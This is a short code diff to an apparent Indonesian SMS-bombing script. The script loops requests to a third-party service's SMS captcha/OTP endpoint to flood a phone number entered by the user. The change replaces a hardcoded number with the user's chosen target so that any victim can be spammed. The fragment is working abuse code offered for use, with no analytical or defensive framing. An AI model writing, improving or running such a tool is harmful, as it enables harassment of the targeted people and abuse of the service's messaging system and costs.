@@ -37,7 +37,7 @@ def sms():
     num = input('+cMasukan Nomor Tanpa 62/0 : ')
     jum = int(input('Jumlah :'))
     for i in range(jum):
-        req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile=85885105039&mobile_country_code=62&channel=Sms&_=1591007074597')
+        req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile='+num+'&mobile_country_code=62&channel=Sms&_=1591007074597')
         if req.status_code == 200:
            print(a+'Succes Sent To :' +num)
         else:
